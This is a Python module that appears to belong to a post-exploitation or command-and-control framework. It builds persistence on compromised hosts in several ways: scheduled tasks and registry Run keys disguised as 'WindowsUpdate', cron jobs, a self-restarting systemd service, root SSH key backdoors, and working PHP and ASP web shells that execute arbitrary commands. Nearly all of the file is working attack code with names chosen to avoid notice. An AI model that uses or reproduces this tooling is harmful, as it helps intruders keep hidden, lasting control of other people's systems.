#!/usr/bin/env python3
"""
Persistence Methods for Sessions - Fixed Version
"""

import os
import platform
import base64

class PersistenceManager:
    def __init__(self, session_db):
        self.session_db = session_db
        self.methods = {
            'windows_scheduled_task': self.windows_scheduled_task,
            'windows_registry': self.windows_registry,
            'linux_cron': self.linux_cron,
            'linux_systemd': self.linux_systemd,  # This method was missing
            'ssh_keys': self.ssh_keys,
            'web_shell': self.web_shell
        }
    
    def add_persistence(self, session_id, method, payload, options=None):
        """Add persistence to target"""
        if method not in self.methods:
            print(f"[-] Unknown persistence method: {method}")
            return False
        
        if options is None:
            options = {}
        
        try:
            configuration = self.methods[method](payload, options)
            self.session_db.add_persistence(session_id, method, configuration)
            return True
        except Exception as e:
            print(f"[-] Persistence failed: {e}")
            return False
    
    def windows_scheduled_task(self, payload, options):
        """Create Windows scheduled task for persistence"""
        task_name = options.get('task_name', 'WindowsUpdate')
        interval = options.get('interval', 'hourly')
        
        persistence_cmd = f"""
schtasks /create /tn "{task_name}" /tr "cmd /c {payload}" /sc {interval} /mo 1 /f
schtasks /run /tn "{task_name}"
"""
        
        return {
            'method': 'windows_scheduled_task',
            'command': persistence_cmd,
            'task_name': task_name,
            'interval': interval
        }
    
    def windows_registry(self, payload, options):
        """Add to Windows registry Run key"""
        key_name = options.get('key_name', 'WindowsUpdate')
        
        persistence_cmd = f"""
reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{payload}" /f
"""
        
        return {
            'method': 'windows_registry',
            'command': persistence_cmd,
            'key_name': key_name
        }
    
    def linux_cron(self, payload, options):
        """Add Linux cron job for persistence"""
        interval = options.get('interval', '@hourly')
        
        cron_line = f"{interval} {payload}\n"
        
        return {
            'method': 'linux_cron',
            'command': f'echo "{cron_line}" | crontab -',
            'cron_line': cron_line.strip()
        }
    
    def linux_systemd(self, payload, options):
        """Create Linux systemd service for persistence"""
        service_name = options.get('service_name', 'system-update')
        
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
        
        persistence_cmd = f"""
echo '{service_content}' > /etc/systemd/system/{service_name}.service
systemctl daemon-reload
systemctl enable {service_name}.service
systemctl start {service_name}.service
"""
        
        return {
            'method': 'linux_systemd',
            'command': persistence_cmd,
            'service_name': service_name,
            'service_content': base64.b64encode(service_content.encode()).decode()
        }
    
    def ssh_keys(self, payload, options):
        """Add SSH authorized keys for persistence"""
        ssh_key = options.get('ssh_key', 'ssh-rsa AAAAB3NzaC1yc2E...')
        username = options.get('username', 'root')
        
        persistence_cmd = f"""
mkdir -p /home/{username}/.ssh
echo '{ssh_key}' >> /home/{username}/.ssh/authorized_keys
chmod 600 /home/{username}/.ssh/authorized_keys
"""
        
        return {
            'method': 'ssh_keys',
            'command': persistence_cmd,
            'username': username
        }
    
    def web_shell(self, payload, options):
        """Deploy web shell for persistence"""
        shell_type = options.get('shell_type', 'php')
        path = options.get('path', '/var/www/html/shell.php')
        
        if shell_type == 'php':
            shell_content = f"""<?php 
if(isset($_GET['cmd'])) {{
    system($_GET['cmd']);
}}
?>"""
        elif shell_type == 'asp':
            shell_content = f"""<%@ Language=VBScript %>
<%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

On Error Resume Next

Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

szCMD = Request.Form(".cmd")
If (szCMD <> "") Then
    szTempFile = "C:\\" & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If
%>"""
        else:
            shell_content = payload
        
        return {
            'method': 'web_shell',
            'shell_type': shell_type,
            'path': path,
            'content': base64.b64encode(shell_content.encode()).decode()
        }